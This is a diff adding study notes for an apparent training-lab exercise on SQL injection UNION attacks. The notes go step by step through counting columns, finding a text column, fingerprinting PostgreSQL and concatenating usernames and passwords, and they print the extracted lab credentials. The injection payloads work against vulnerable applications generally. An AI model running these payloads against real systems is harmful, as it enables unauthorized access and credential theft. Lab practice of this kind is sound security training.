@@ -1,0 +1,54 @@
+Lab #6 SQL injection UNION attack, retrieving multiple values in a single column.
+
+SQL Injection - Product category filter
+
+
+End Goal: retrieve all usernames and passwords and login as
+the administrator user.
+
+-----------------------------------------------------------------------
+
+Steps:
+
+1. Find the number of columns.
+    - use order by clause.
+
+' Order by 1--  => 200OK    => Not displayed on the page(Items not arranged in ascending order)
+' Order by 2--  => 200OK    => displayed on the page.
+' Order by 3--  => Internal server Error
+
+Therefore number of columns = 2
+
+2. Find which column contains the data type text.
+
+' UNION select 'a', NULL--      => Internal server Error(Means the column does not accept data type text)
+' UNION select NULL, 'a'--      => 200OK 
+
+3. Output data from other tables.
+
+First we'll get the usernames and then passwords as we have only one column to output the data.
+
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+Now we'll concatenate the users and passwords query.
+for that first we have to find the database we are dealing with.
+Check the SQLi cheat sheet from the portswigger.
+
+' UNION select NULL, banner from v$version--      => Oracle 
+' UNION select NULL, @@version--        => Microsoft, MySQL
+' UNION select NULL, version()--        => PostgreSQL  
+
+Try all these to get the version of the database.
+
+    PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+Now check how to concatenate strings in PostgreSQL database.
+
+' UNION select NULL, username || password from users--      => If we cannot find the difference between username and password add another character to deffrentiate between them.(*)
+
+' UNION select NULL, username || '*' || password from users--
+
+    administrator*ufqr5pvytyl1ormasoes
+    wiener*io3a1gjxmc5svo6rqx8j
+    carlos*9a7p0pjwmpc67gayl6mj
